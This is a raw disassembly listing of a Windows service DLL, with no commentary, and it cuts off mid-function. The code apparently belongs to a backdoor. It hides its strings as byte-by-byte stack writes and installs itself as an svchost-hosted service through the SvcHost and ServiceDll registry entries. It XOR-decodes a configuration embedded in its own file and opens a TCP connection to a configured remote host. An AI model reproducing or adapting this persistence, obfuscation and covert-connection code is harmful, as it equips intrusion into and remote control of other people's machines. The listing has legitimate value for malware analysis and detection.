		push	ebx
		push	esi
		push	edi
		xor	eax, eax
		lea	edi, [ebp+name.sa_data]
		stosd
		stosd
		and	[ebp+cp], 0
		push	40h
		stosd
		stosw
		pop	ecx
		xor	eax, eax
		lea	edi, [ebp+var_123]
		push	[ebp+optval]	; lpString2
		rep stosd
		mov	ebx, ds:lstrcpyA
		stosw
		stosb
		lea	eax, [ebp+cp]
		push	eax		; lpString1
		call	ebx ; lstrcpyA
		mov	esi, ds:inet_addr
		lea	eax, [ebp+cp]
		push	eax		; cp
		call	esi ; inet_addr
		cmp	eax, 0FFFFFFFFh
		jnz	short loc_1000198D
		lea	eax, [ebp+cp]
		push	eax		; name
		call	ds:gethostbyname
		mov	ecx, eax
		test	ecx, ecx
		jz	loc_100019FA
		and	[ebp+var_20], 0
		xor	eax, eax
		lea	edi, [ebp+var_1E]
		stosd
		stosd
		stosd
		stosw
		movsx	eax, word ptr [ecx+0Ah]
		push	eax		; Size
		mov	eax, [ecx+0Ch]
		push	dword ptr [eax]	; Src
		lea	eax, [ebp+Dst]
		push	eax		; Dst
		call	memcpy
		add	esp, 0Ch
		push	[ebp+Dst]	; in
		call	ds:inet_ntoa
		push	eax		; lpString2
		lea	eax, [ebp+cp]
		push	eax		; lpString1
		call	ebx ; lstrcpyA

loc_1000198D:				; CODE XREF: sub_100018E6+56j
		lea	eax, [ebp+cp]
		push	eax		; cp
		call	esi ; inet_addr
		push	dword ptr [ebp+hostshort] ; hostshort
		mov	dword ptr [ebp+name.sa_data+2],	eax
		call	ds:htons
		push	6		; protocol
		push	1		; type
		push	2		; af
		mov	word ptr [ebp+name.sa_data], ax
		mov	[ebp+name.sa_family], 2
		call	ds:socket
		mov	esi, eax
		cmp	esi, 0FFFFFFFFh
		jz	short loc_100019FA
		lea	eax, [ebp+name]
		push	10h		; namelen
		push	eax		; name
		push	esi		; s
		call	ds:connect
		cmp	eax, 0FFFFFFFFh
		jz	short loc_100019F3
		lea	eax, [ebp+optval]
		push	4		; optlen
		push	eax		; optval
		push	1006h		; optname
		push	0FFFFh		; level
		push	esi		; s
		mov	[ebp+optval], 1B7740h
		call	ds:setsockopt
		test	eax, eax
		jz	short loc_100019FE

loc_100019F3:				; CODE XREF: sub_100018E6+E9j
		push	esi		; s
		call	ds:closesocket

loc_100019FA:				; CODE XREF: sub_100018E6+69j
					; sub_100018E6+D7j
		xor	eax, eax
		jmp	short loc_10001A00
; ---------------------------------------------------------------------------

loc_100019FE:				; CODE XREF: sub_100018E6+10Bj
		mov	eax, esi

loc_10001A00:				; CODE XREF: sub_100018E6+116j
		pop	edi
		pop	esi
		pop	ebx
		leave
		retn	8
sub_100018E6	endp


; =============== S U B	R O U T	I N E =======================================


sub_10001A07	proc near		; CODE XREF: ServiceMain:loc_1000331Dp
		push	esi
		mov	esi, offset ValueName
		push	esi		; lpServiceName
		call	sub_10001D19
		call	sub_10001BC3
		call	sub_1000205E
		push	esi		; lpServiceName
		call	sub_10001B73
		pop	ecx
		pop	ecx
		pop	esi
		retn
sub_10001A07	endp


; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

; int __cdecl sub_10001A27(LPCSTR hFile, int, int)
sub_10001A27	proc near		; CODE XREF: sub_10001656+C0p
					; sub_10001AAB+50p

NumberOfBytesRead= dword ptr -4
hFile		= dword	ptr  8
arg_4		= dword	ptr  0Ch
arg_8		= dword	ptr  10h

		push	ebp
		mov	ebp, esp
		push	ecx
		push	ebx
		xor	ebx, ebx
		push	ebx		; hTemplateFile
		push	80h		; dwFlagsAndAttributes
		push	3		; dwCreationDisposition
		push	ebx		; lpSecurityAttributes
		push	1		; dwShareMode
		push	80000000h	; dwDesiredAccess
		push	[ebp+hFile]	; lpFileName
		call	ds:CreateFileA
		cmp	eax, 0FFFFFFFFh
		mov	[ebp+hFile], eax
		jnz	short loc_10001A53
		xor	eax, eax
		jmp	short loc_10001AA8
; ---------------------------------------------------------------------------

loc_10001A53:				; CODE XREF: sub_10001A27+26j
		push	esi
		push	edi
		push	ebx		; lpFileSizeHigh
		push	eax		; hFile
		mov	[ebp+NumberOfBytesRead], ebx
		call	ds:GetFileSize
		mov	esi, [ebp+arg_8]
		mov	[esi], eax
		add	eax, 400h
		push	eax		; unsigned int
		call	??2@YAPAXI@Z	; operator new(uint)
		mov	edi, [ebp+arg_4]
		mov	[edi], eax
		mov	ecx, [esi]
		add	ecx, 400h
		push	ecx		; Size
		push	ebx		; Val
		push	eax		; Dst
		call	memset
		add	esp, 10h
		lea	eax, [ebp+NumberOfBytesRead]
		push	ebx		; lpOverlapped
		push	eax		; lpNumberOfBytesRead
		push	dword ptr [esi]	; nNumberOfBytesToRead
		push	dword ptr [edi]	; lpBuffer
		push	[ebp+hFile]	; hFile
		call	ds:ReadFile
		push	[ebp+hFile]	; hObject
		call	ds:CloseHandle
		push	1
		pop	eax
		pop	edi
		pop	esi

loc_10001AA8:				; CODE XREF: sub_10001A27+2Aj
		pop	ebx
		leave
		retn
sub_10001A27	endp


; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

; int __cdecl sub_10001AAB(void	*Dst)
sub_10001AAB	proc near		; CODE XREF: ServiceMain+10p

hFile		= byte ptr -10Ch
var_10B		= byte ptr -10Bh
var_8		= dword	ptr -8
var_4		= dword	ptr -4
Dst		= dword	ptr  8

		push	ebp
		mov	ebp, esp
		sub	esp, 10Ch
		and	[ebp+hFile], 0
		push	edi
		push	40h
		xor	eax, eax
		pop	ecx
		lea	edi, [ebp+var_10B]
		rep stosd
		stosw
		stosb
		lea	eax, [ebp+hFile]
		push	0C8h		; nSize
		push	eax		; lpFilename
		push	hModule		; hModule
		call	ds:GetModuleFileNameA
		lea	eax, [ebp+var_8]
		and	[ebp+var_4], 0
		and	[ebp+var_8], 0
		push	eax		; int
		lea	eax, [ebp+var_4]
		push	eax		; int
		lea	eax, [ebp+hFile]
		push	eax		; hFile
		call	sub_10001A27
		add	esp, 0Ch
		test	eax, eax
		jz	short loc_10001B70
		mov	eax, [ebp+var_8]
		mov	edx, [ebp+var_4]
		add	eax, 0FFFFFFF8h
		push	esi
		cmp	eax, 8
		jbe	short loc_10001B36
		mov	ecx, 12345678h

loc_10001B1B:				; CODE XREF: sub_10001AAB+7Fj
		cmp	[eax+edx], ecx
		jnz	short loc_10001B26
		cmp	[eax+edx+4], ecx
		jz	short loc_10001B2E

loc_10001B26:				; CODE XREF: sub_10001AAB+73j
		dec	eax
		cmp	eax, 8
		ja	short loc_10001B1B
		jmp	short loc_10001B36
; ---------------------------------------------------------------------------

loc_10001B2E:				; CODE XREF: sub_10001AAB+79j
		lea	eax, [eax+edx+8]
		test	eax, eax
		jnz	short loc_10001B3A

loc_10001B36:				; CODE XREF: sub_10001AAB+69j
					; sub_10001AAB+81j
		xor	esi, esi
		jmp	short loc_10001B66
; ---------------------------------------------------------------------------

loc_10001B3A:				; CODE XREF: sub_10001AAB+89j
		mov	esi, 514h
		lea	edi, [eax+514h]
		push	esi		; Size
		push	eax		; Src
		push	[ebp+Dst]	; Dst
		call	memcpy
		mov	eax, [ebp+Dst]
		add	esp, 0Ch
		sub	edi, eax

loc_10001B57:				; CODE XREF: sub_10001AAB+B3j
		mov	cl, [edi+eax]
		xor	[eax], cl
		inc	eax
		dec	esi
		jnz	short loc_10001B57
		mov	edx, [ebp+var_4]
		push	1
		pop	esi

loc_10001B66:				; CODE XREF: sub_10001AAB+8Dj
		push	edx		; void *
		call	??3@YAXPAX@Z	; operator delete(void *)
		pop	ecx
		mov	eax, esi
		pop	esi

loc_10001B70:				; CODE XREF: sub_10001AAB+5Aj
		pop	edi
		leave
		retn
sub_10001AAB	endp


; =============== S U B	R O U T	I N E =======================================


; int __cdecl sub_10001B73(LPCSTR lpServiceName)
sub_10001B73	proc near		; CODE XREF: sub_10001A07+17p

lpServiceName	= dword	ptr  4

		push	esi
		push	edi
		push	0F003Fh		; dwDesiredAccess
		push	0		; lpDatabaseName
		push	0		; lpMachineName
		call	ds:OpenSCManagerA
		mov	edi, eax
		test	edi, edi
		jz	short loc_10001BC0
		push	0F01FFh		; dwDesiredAccess
		push	[esp+0Ch+lpServiceName]	; lpServiceName
		push	edi		; hSCManager
		call	ds:OpenServiceA
		mov	esi, eax
		test	esi, esi
		jnz	short loc_10001BA9
		push	edi		; hSCObject
		call	ds:CloseServiceHandle
		jmp	short loc_10001BC0
; ---------------------------------------------------------------------------

loc_10001BA9:				; CODE XREF: sub_10001B73+2Bj
		push	0		; lpServiceArgVectors
		push	0		; dwNumServiceArgs
		push	esi		; hService
		call	ds:StartServiceA
		push	esi		; hSCObject
		mov	esi, ds:CloseServiceHandle
		call	esi ; CloseServiceHandle
		push	edi		; hSCObject
		call	esi ; CloseServiceHandle

loc_10001BC0:				; CODE XREF: sub_10001B73+15j
					; sub_10001B73+34j
		pop	edi
		pop	esi
		retn
sub_10001B73	endp


; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

sub_10001BC3	proc near		; CODE XREF: sub_10001A07+Cp

BinaryPathName	= byte ptr -20Ch
var_20B		= byte ptr -20Bh
String2		= byte ptr -108h
var_107		= byte ptr -107h
var_106		= byte ptr -106h
var_105		= byte ptr -105h
var_104		= byte ptr -104h
var_103		= byte ptr -103h
var_102		= byte ptr -102h
var_101		= byte ptr -101h
var_100		= byte ptr -100h
var_FF		= byte ptr -0FFh
var_FE		= byte ptr -0FEh
var_FD		= byte ptr -0FDh
var_FC		= byte ptr -0FCh
var_FB		= byte ptr -0FBh
var_FA		= byte ptr -0FAh
var_F9		= byte ptr -0F9h
var_F8		= byte ptr -0F8h
Info		= dword	ptr -8
hSCObject	= dword	ptr -4

		push	ebp
		mov	ebp, esp
		sub	esp, 20Ch
		push	ebx
		xor	ebx, ebx
		push	0F003Fh		; dwDesiredAccess
		push	ebx		; lpDatabaseName
		push	ebx		; lpMachineName
		call	ds:OpenSCManagerA
		cmp	eax, ebx
		mov	[ebp+hSCObject], eax
		jnz	short loc_10001BEA
		xor	eax, eax
		jmp	loc_10001D16
; ---------------------------------------------------------------------------

loc_10001BEA:				; CODE XREF: sub_10001BC3+1Ej
		push	esi
		push	edi
		push	3Fh
		xor	eax, eax
		pop	ecx
		lea	edi, [ebp+var_107]
		rep stosd
		stosw
		stosb
		push	40h
		xor	eax, eax
		pop	ecx
		lea	edi, [ebp+var_20B]
		mov	[ebp+BinaryPathName], bl
		push	0C8h		; uSize
		rep stosd
		stosw
		stosb
		lea	eax, [ebp+BinaryPathName]
		mov	[ebp+String2], 5Ch
		push	eax		; lpBuffer
		mov	[ebp+var_107], 73h
		mov	[ebp+var_106], 76h
		mov	[ebp+var_105], 63h
		mov	[ebp+var_104], 68h
		mov	[ebp+var_103], 6Fh
		mov	[ebp+var_102], 73h
		mov	[ebp+var_101], 74h
		mov	[ebp+var_100], 2Eh
		mov	[ebp+var_FF], 65h
		mov	[ebp+var_FE], 78h
		mov	[ebp+var_FD], 65h
		mov	[ebp+var_FC], 20h
		mov	[ebp+var_FB], 2Dh
		mov	[ebp+var_FA], 6Bh
		mov	[ebp+var_F9], 20h
		mov	[ebp+var_F8], bl
		call	ds:GetSystemDirectoryA
		mov	esi, ds:lstrcatA
		lea	eax, [ebp+String2]
		push	eax		; lpString2
		lea	eax, [ebp+BinaryPathName]
		push	eax		; lpString1
		call	esi ; lstrcatA
		mov	edi, offset ValueName
		lea	eax, [ebp+BinaryPathName]
		push	edi		; lpString2
		push	eax		; lpString1
		call	esi ; lstrcatA
		push	ebx		; lpPassword
		push	ebx		; lpServiceStartName
		push	ebx		; lpDependencies
		push	ebx		; lpdwTagId
		lea	eax, [ebp+BinaryPathName]
		push	ebx		; lpLoadOrderGroup
		push	eax		; lpBinaryPathName
		push	1		; dwErrorControl
		push	2		; dwStartType
		push	110h		; dwServiceType
		push	0F01FFh		; dwDesiredAccess
		push	offset DisplayName ; lpDisplayName
		push	edi		; lpServiceName
		push	[ebp+hSCObject]	; hSCManager
		call	ds:CreateServiceA
		mov	edi, ds:CloseServiceHandle
		mov	esi, eax
		cmp	esi, ebx
		jz	short loc_10001D0D
		lea	eax, [ebp+Info]
		mov	[ebp+Info], offset dword_100053F8
		push	eax		; lpInfo
		push	1
		pop	ebx
		push	ebx		; dwInfoLevel
		push	esi		; hService
		call	ds:ChangeServiceConfig2A
		push	esi		; hSCObject
		call	edi ; CloseServiceHandle

loc_10001D0D:				; CODE XREF: sub_10001BC3+12Fj
		push	[ebp+hSCObject]	; hSCObject
		call	edi ; CloseServiceHandle
		pop	edi
		mov	eax, ebx
		pop	esi

loc_10001D16:				; CODE XREF: sub_10001BC3+22j
		pop	ebx
		leave
		retn
sub_10001BC3	endp


; =============== S U B	R O U T	I N E =======================================


; int __cdecl sub_10001D19(LPCSTR lpServiceName)
sub_10001D19	proc near		; CODE XREF: sub_10001A07+7p
					; sub_1000296A+F4p

lpServiceName	= dword	ptr  4

		push	esi
		push	edi
		push	0F003Fh		; dwDesiredAccess
		push	0		; lpDatabaseName
		push	0		; lpMachineName
		call	ds:OpenSCManagerA
		mov	edi, eax
		test	edi, edi
		jz	short loc_10001D62
		push	0F01FFh		; dwDesiredAccess
		push	[esp+0Ch+lpServiceName]	; lpServiceName
		push	edi		; hSCManager
		call	ds:OpenServiceA
		mov	esi, eax
		test	esi, esi
		jnz	short loc_10001D4F
		push	edi		; hSCObject
		call	ds:CloseServiceHandle
		jmp	short loc_10001D62
; ---------------------------------------------------------------------------

loc_10001D4F:				; CODE XREF: sub_10001D19+2Bj
		push	esi		; hService
		call	ds:DeleteService
		push	esi		; hSCObject
		mov	esi, ds:CloseServiceHandle
		call	esi ; CloseServiceHandle
		push	edi		; hSCObject
		call	esi ; CloseServiceHandle

loc_10001D62:				; CODE XREF: sub_10001D19+15j
					; sub_10001D19+34j
		pop	edi
		pop	esi
		retn
sub_10001D19	endp


; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

; int __cdecl sub_10001D65(LPCSTR lpSubKey, LPCSTR lpString2)
sub_10001D65	proc near		; CODE XREF: sub_1000205E+4FDp
					; sub_1000205E+539p

String		= byte ptr -20Ch
var_20B		= byte ptr -20Bh
ValueName	= byte ptr -108h
var_107		= byte ptr -107h
var_106		= byte ptr -106h
var_105		= byte ptr -105h
var_104		= byte ptr -104h
var_103		= byte ptr -103h
var_102		= byte ptr -102h
var_101		= byte ptr -101h
var_100		= byte ptr -100h
var_FF		= byte ptr -0FFh
var_FE		= byte ptr -0FEh
dwDisposition	= dword	ptr -8
hKey		= dword	ptr -4
lpSubKey	= dword	ptr  8
lpString2	= dword	ptr  0Ch

		push	ebp
		mov	ebp, esp
		sub	esp, 20Ch
		lea	eax, [ebp+dwDisposition]
		push	ebx
		push	eax		; lpdwDisposition
		lea	eax, [ebp+hKey]
		xor	ebx, ebx
		push	eax		; phkResult
		push	ebx		; lpSecurityAttributes
		push	0F003Fh		; samDesired
		push	ebx		; dwOptions
		push	ebx		; lpClass
		push	ebx		; Reserved
		mov	[ebp+hKey], ebx
		push	[ebp+lpSubKey]	; lpSubKey
		mov	[ebp+dwDisposition], ebx
		push	80000002h	; hKey
		call	ds:RegCreateKeyExA
		test	eax, eax
		jnz	loc_10001E52
		push	edi
		push	3Fh
		pop	ecx
		lea	edi, [ebp+var_107]
		rep stosd
		stosw
		stosb
		push	40h
		xor	eax, eax
		pop	ecx
		lea	edi, [ebp+var_20B]
		mov	[ebp+String], bl
		push	[ebp+lpString2]	; lpString2
		rep stosd
		stosw
		stosb
		lea	eax, [ebp+String]
		mov	[ebp+ValueName], 53h
		push	eax		; lpString1
		mov	[ebp+var_107], 65h
		mov	[ebp+var_106], 72h
		mov	[ebp+var_105], 76h
		mov	[ebp+var_104], 69h
		mov	[ebp+var_103], 63h
		mov	[ebp+var_102], 65h
		mov	[ebp+var_101], 44h
		mov	[ebp+var_100], 6Ch
		mov	[ebp+var_FF], 6Ch
		mov	[ebp+var_FE], bl
		call	ds:lstrcpyA
		lea	eax, [ebp+String]
		push	eax		; lpString
		call	ds:lstrlenA
		inc	eax
		push	eax		; cbData
		lea	eax, [ebp+String]
		push	eax		; lpData
		push	2		; dwType
		lea	eax, [ebp+ValueName]
		push	ebx		; Reserved
		push	eax		; lpValueName
		push	[ebp+hKey]	; hKey
		call	ds:RegSetValueExA
		push	[ebp+hKey]	; hKey
		call	ds:RegCloseKey
		pop	edi

loc_10001E52:				; CODE XREF: sub_10001D65+33j
		pop	ebx
		leave
		retn
sub_10001D65	endp


; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

; int __cdecl sub_10001E55(LPCSTR lpValueName)
sub_10001E55	proc near		; CODE XREF: sub_1000205E+425p

Data		= byte ptr -20Ch
var_20B		= byte ptr -20Bh
SubKey		= byte ptr -108h
var_107		= byte ptr -107h
var_106		= byte ptr -106h
var_105		= byte ptr -105h
var_104		= byte ptr -104h
var_103		= byte ptr -103h
var_102		= byte ptr -102h
var_101		= byte ptr -101h
var_100		= byte ptr -100h
var_FF		= byte ptr -0FFh
var_FE		= byte ptr -0FEh
var_FD		= byte ptr -0FDh
var_FC		= byte ptr -0FCh
var_FB		= byte ptr -0FBh
var_FA		= byte ptr -0FAh
var_F9		= byte ptr -0F9h
var_F8		= byte ptr -0F8h
var_F7		= byte ptr -0F7h
var_F6		= byte ptr -0F6h
var_F5		= byte ptr -0F5h
var_F4		= byte ptr -0F4h
var_F3		= byte ptr -0F3h
var_F2		= byte ptr -0F2h
var_F1		= byte ptr -0F1h
var_F0		= byte ptr -0F0h
var_EF		= byte ptr -0EFh
var_EE		= byte ptr -0EEh
var_ED		= byte ptr -0EDh
var_EC		= byte ptr -0ECh
var_EB		= byte ptr -0EBh
var_EA		= byte ptr -0EAh
var_E9		= byte ptr -0E9h
var_E8		= byte ptr -0E8h
var_E7		= byte ptr -0E7h
var_E6		= byte ptr -0E6h
var_E5		= byte ptr -0E5h
var_E4		= byte ptr -0E4h
var_E3		= byte ptr -0E3h
var_E2		= byte ptr -0E2h
var_E1		= byte ptr -0E1h
var_E0		= byte ptr -0E0h
var_DF		= byte ptr -0DFh
var_DE		= byte ptr -0DEh
var_DD		= byte ptr -0DDh
var_DC		= byte ptr -0DCh
var_DB		= byte ptr -0DBh
var_DA		= byte ptr -0DAh
var_D9		= byte ptr -0D9h
var_D8		= byte ptr -0D8h
var_D7		= byte ptr -0D7h
var_D6		= byte ptr -0D6h
var_D5		= byte ptr -0D5h
dwDisposition	= dword	ptr -8
hKey		= dword	ptr -4
lpValueName	= dword	ptr  8

		push	ebp
		mov	ebp, esp
		sub	esp, 20Ch
		push	ebx
		push	edi
		push	3Fh
		xor	eax, eax
		pop	ecx
		lea	edi, [ebp+var_107]
		rep stosd
		stosw
		stosb
		lea	eax, [ebp+dwDisposition]
		xor	ebx, ebx
		push	eax		; lpdwDisposition
		lea	eax, [ebp+hKey]
		push	eax		; phkResult
		push	ebx		; lpSecurityAttributes
		push	0F003Fh		; samDesired
		push	ebx		; dwOptions
		push	ebx		; lpClass
		lea	eax, [ebp+SubKey]
		push	ebx		; Reserved
		push	eax		; lpSubKey
		push	80000002h	; hKey
		mov	[ebp+SubKey], 53h
		mov	[ebp+var_107], 4Fh
		mov	[ebp+var_106], 46h
		mov	[ebp+var_105], 54h
		mov	[ebp+var_104], 57h
		mov	[ebp+var_103], 41h
		mov	[ebp+var_102], 52h
		mov	[ebp+var_101], 45h
		mov	[ebp+var_100], 5Ch
		mov	[ebp+var_FF], 4Dh
		mov	[ebp+var_FE], 69h
		mov	[ebp+var_FD], 63h
		mov	[ebp+var_FC], 72h
		mov	[ebp+var_FB], 6Fh
		mov	[ebp+var_FA], 73h
		mov	[ebp+var_F9], 6Fh
		mov	[ebp+var_F8], 66h
		mov	[ebp+var_F7], 74h
		mov	[ebp+var_F6], 5Ch
		mov	[ebp+var_F5], 57h
		mov	[ebp+var_F4], 69h
		mov	[ebp+var_F3], 6Eh
		mov	[ebp+var_F2], 64h
		mov	[ebp+var_F1], 6Fh
		mov	[ebp+var_F0], 77h
		mov	[ebp+var_EF], 73h
		mov	[ebp+var_EE], 20h
		mov	[ebp+var_ED], 4Eh
		mov	[ebp+var_EC], 54h
		mov	[ebp+var_EB], 5Ch
		mov	[ebp+var_EA], 43h
		mov	[ebp+var_E9], 75h
		mov	[ebp+var_E8], 72h
		mov	[ebp+var_E7], 72h
		mov	[ebp+var_E6], 65h
		mov	[ebp+var_E5], 6Eh
		mov	[ebp+var_E4], 74h
		mov	[ebp+var_E3], 56h
		mov	[ebp+var_E2], 65h
		mov	[ebp+var_E1], 72h
		mov	[ebp+var_E0], 73h
		mov	[ebp+var_DF], 69h
		mov	[ebp+var_DE], 6Fh
		mov	[ebp+var_DD], 6Eh
		mov	[ebp+var_DC], 5Ch
		mov	[ebp+var_DB], 53h
		mov	[ebp+var_DA], 76h
		mov	[ebp+var_D9], 63h
		mov	[ebp+var_D8], 48h
		mov	[ebp+var_D7], 6Fh
		mov	[ebp+var_D6], 73h
		mov	[ebp+var_D5], 74h
		mov	[ebp+hKey], ebx
		mov	[ebp+dwDisposition], ebx
		call	ds:RegCreateKeyExA
		test	eax, eax
		jnz	short loc_1000205A
		push	40h
		lea	edi, [ebp+var_20B]
		pop	ecx
		mov	[ebp+Data], bl
		rep stosd
		push	[ebp+lpValueName] ; lpString2
		stosw
		stosb
		lea	eax, [ebp+Data]
		push	eax		; lpString1
		call	ds:lstrcpyA
		push	[ebp+lpValueName] ; lpString
		call	ds:lstrlenA
		inc	eax
		inc	eax
		push	eax		; cbData
		lea	eax, [ebp+Data]
		push	eax		; lpData
		push	7		; dwType
		push	ebx		; Reserved
		push	[ebp+lpValueName] ; lpValueName
		push	[ebp+hKey]	; hKey
		call	ds:RegSetValueExA
		push	[ebp+hKey]	; hKey
		call	ds:RegCloseKey

loc_1000205A:				; CODE XREF: sub_10001E55+1B4j
		pop	edi
		pop	ebx
		leave
		retn
sub_10001E55	endp


; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

sub_1000205E	proc near		; CODE XREF: sub_10001A07+11p

SubKey		= byte ptr -804h
var_803		= byte ptr -803h
String		= byte ptr -700h
var_6FF		= byte ptr -6FFh
var_600		= byte ptr -600h
var_5FF		= byte ptr -5FFh
var_5FE		= byte ptr -5FEh
var_5FD		= byte ptr -5FDh
var_5FC		= byte ptr -5FCh
var_5FB		= byte ptr -5FBh
var_5FA		= byte ptr -5FAh
var_5F9		= byte ptr -5F9h
var_500		= byte ptr -500h
var_4FF		= byte ptr -4FFh
var_4FE		= byte ptr -4FEh
var_4FD		= byte ptr -4FDh
var_4FC		= byte ptr -4FCh
var_4FB		= byte ptr -4FBh
var_4FA		= byte ptr -4FAh
var_4F9		= byte ptr -4F9h
var_4F8		= byte ptr -4F8h
var_4F7		= byte ptr -4F7h
var_4F6		= byte ptr -4F6h
var_400		= byte ptr -400h
var_3FF		= byte ptr -3FFh
var_3FE		= byte ptr -3FEh
var_3FD		= byte ptr -3FDh
var_3FC		= byte ptr -3FCh
var_3FB		= byte ptr -3FBh
var_3FA		= byte ptr -3FAh
var_3F9		= byte ptr -3F9h
var_3F8		= byte ptr -3F8h
var_3F7		= byte ptr -3F7h
var_3F6		= byte ptr -3F6h
var_3F5		= byte ptr -3F5h
var_3F4		= byte ptr -3F4h
var_3F3		= byte ptr -3F3h
var_300		= byte ptr -300h
var_2FF		= byte ptr -2FFh
var_2FE		= byte ptr -2FEh
var_2FD		= byte ptr -2FDh
var_2FC		= byte ptr -2FCh
var_2FB		= byte ptr -2FBh
var_2FA		= byte ptr -2FAh
var_2F9		= byte ptr -2F9h
var_2F8		= byte ptr -2F8h
var_2F7		= byte ptr -2F7h
var_2F6		= byte ptr -2F6h
var_2F5		= byte ptr -2F5h
var_2F4		= byte ptr -2F4h
var_2F3		= byte ptr -2F3h
var_2F2		= byte ptr -2F2h
var_2F1		= byte ptr -2F1h
var_2F0		= byte ptr -2F0h
var_2EF		= byte ptr -2EFh
var_200		= byte ptr -200h
var_1FF		= byte ptr -1FFh
var_1FE		= byte ptr -1FEh
var_1FD		= byte ptr -1FDh
var_1FC		= byte ptr -1FCh
var_1FB		= byte ptr -1FBh
var_1FA		= byte ptr -1FAh
var_1F9		= byte ptr -1F9h
var_1F8		= byte ptr -1F8h
var_1F7		= byte ptr -1F7h
var_1F6		= byte ptr -1F6h
var_1F5		= byte ptr -1F5h
var_1F4		= byte ptr -1F4h
var_1F3		= byte ptr -1F3h
var_1F2		= byte ptr -1F2h
var_1F1		= byte ptr -1F1h
var_1F0		= byte ptr -1F0h
var_1EF		= byte ptr -1EFh
var_1EE		= byte ptr -1EEh
var_1ED		= byte ptr -1EDh
String2		= byte ptr -100h
var_FF		= byte ptr -0FFh
var_FE		= byte ptr -0FEh
var_FD		= byte ptr -0FDh
var_FC		= byte ptr -0FCh
var_FB		= byte ptr -0FBh
var_FA		= byte ptr -0FAh
var_F9		= byte ptr -0F9h
var_F8		= byte ptr -0F8h
var_F7		= byte ptr -0F7h
var_F6		= byte ptr -0F6h
var_F5		= byte ptr -0F5h
var_F4		= byte ptr -0F4h
var_F3		= byte ptr -0F3h
var_F2		= byte ptr -0F2h
var_F1		= byte ptr -0F1h
var_F0		= byte ptr -0F0h
var_EF		= byte ptr -0EFh
var_EE		= byte ptr -0EEh
var_ED		= byte ptr -0EDh
var_EC		= byte ptr -0ECh
var_EB		= byte ptr -0EBh
var_EA		= byte ptr -0EAh
var_E9		= byte ptr -0E9h
var_E8		= byte ptr -0E8h
var_E7		= byte ptr -0E7h
var_E6		= byte ptr -0E6h
var_E5		= byte ptr -0E5h
var_E4		= byte ptr -0E4h
var_E3		= byte ptr -0E3h
var_E2		= byte ptr -0E2h
var_E1		= byte ptr -0E1h
var_E0		= byte ptr -0E0h
var_DF		= byte ptr -0DFh
var_DE		= byte ptr -0DEh
var_DD		= byte ptr -0DDh
var_DC		= byte ptr -0DCh
var_DB		= byte ptr -0DBh
var_DA		= byte ptr -0DAh
var_D9		= byte ptr -0D9h
var_D8		= byte ptr -0D8h
var_D7		= byte ptr -0D7h
var_D6		= byte ptr -0D6h
var_D5		= byte ptr -0D5h
var_D4		= byte ptr -0D4h

		push	ebp
		mov	ebp, esp
		sub	esp, 804h
		and	[ebp+String], 0
		push	ebx
		push	esi
		push	edi
		push	3Fh
		xor	eax, eax
		pop	ecx
		lea	edi, [ebp+var_6FF]
		rep stosd
		cmp	dword_10005184,	0
		push	3Fh
		stosw
		stosb
		pop	ecx
		jnz	loc_10002143
		xor	eax, eax
		lea	edi, [ebp+var_FF]
		rep stosd
		stosw
		stosb
		and	[ebp+var_EB], 0
		mov	[ebp+String2], 25h
		mov	[ebp+var_FF], 53h
		mov	[ebp+var_FE], 79h
		mov	[ebp+var_FD], 73h
		mov	[ebp+var_FC], 74h
		mov	[ebp+var_FB], 65h
		mov	[ebp+var_FA], 6Dh
		mov	[ebp+var_F9], 52h
		mov	[ebp+var_F8], 6Fh
		mov	[ebp+var_F7], 6Fh
		mov	[ebp+var_F6], 74h
		mov	[ebp+var_F5], 25h
		mov	[ebp+var_F4], 5Ch
		mov	[ebp+var_F3], 53h
		mov	[ebp+var_F2], 79h
		mov	[ebp+var_F1], 73h
		mov	[ebp+var_F0], 74h
		mov	[ebp+var_EF], 65h
		mov	[ebp+var_EE], 6Dh
		mov	[ebp+var_ED], 33h
		mov	[ebp+var_EC], 32h
		lea	eax, [ebp+String2]
		jmp	loc_10002291
; ---------------------------------------------------------------------------

loc_10002143:				; CODE XREF: sub_1000205E+2Dj
		xor	eax, eax
		lea	edi, [ebp+var_FF]
		rep stosd
		stosw
		stosb
		and	[ebp+var_D4], 0
		mov	[ebp+String2], 25h
		mov	[ebp+var_FF], 50h
		mov	[ebp+var_FE], 72h
		mov	[ebp+var_FD], 6Fh
		mov	[ebp+var_FC], 67h
		mov	[ebp+var_FB], 72h
		mov	[ebp+var_FA], 61h
		mov	[ebp+var_F9], 6Dh
		mov	[ebp+var_F8], 46h
		mov	[ebp+var_F7], 69h
		mov	[ebp+var_F6], 6Ch
		mov	[ebp+var_F5], 65h
		mov	[ebp+var_F4], 73h
		mov	[ebp+var_F3], 25h
		mov	[ebp+var_F2], 5Ch
		mov	[ebp+var_F1], 43h
		mov	[ebp+var_F0], 6Fh
		mov	[ebp+var_EF], 6Dh
		mov	[ebp+var_EE], 6Dh
		mov	[ebp+var_ED], 6Fh
		mov	[ebp+var_EC], 6Eh
		mov	[ebp+var_EB], 20h
		mov	[ebp+var_EA], 46h
		mov	[ebp+var_E9], 69h
		mov	[ebp+var_E8], 6Ch
		mov	[ebp+var_E7], 65h
		mov	[ebp+var_E6], 73h
		mov	[ebp+var_E5], 5Ch
		mov	[ebp+var_E4], 4Dh
		mov	[ebp+var_E3], 69h
		mov	[ebp+var_E2], 63h
		mov	[ebp+var_E1], 72h
		mov	[ebp+var_E0], 6Fh
		mov	[ebp+var_DF], 73h
		mov	[ebp+var_DE], 6Fh
		mov	[ebp+var_DD], 66h
		mov	[ebp+var_DC], 74h
		mov	[ebp+var_DB], 20h
		mov	[ebp+var_DA], 53h
		mov	[ebp+var_D9], 68h
		mov	[ebp+var_D8], 61h
		mov	[ebp+var_D7], 72h
		mov	[ebp+var_D6], 65h
		mov	[ebp+var_D5], 64h
		lea	eax, [ebp+String2]

loc_10002291:				; CODE XREF: sub_1000205E+E0j
		push	eax		; lpString2
		lea	eax, [ebp+String]
		push	eax		; lpString1
		call	ds:lstrcpyA
		mov	esi, offset ValueName
		lea	eax, [ebp+String]
		push	esi
		push	offset aS_dll	; "\\%s.dll"
		push	eax		; lpString
		call	ds:lstrlenA
		mov	ebx, ds:wsprintfA
		lea	eax, [ebp+eax+String]
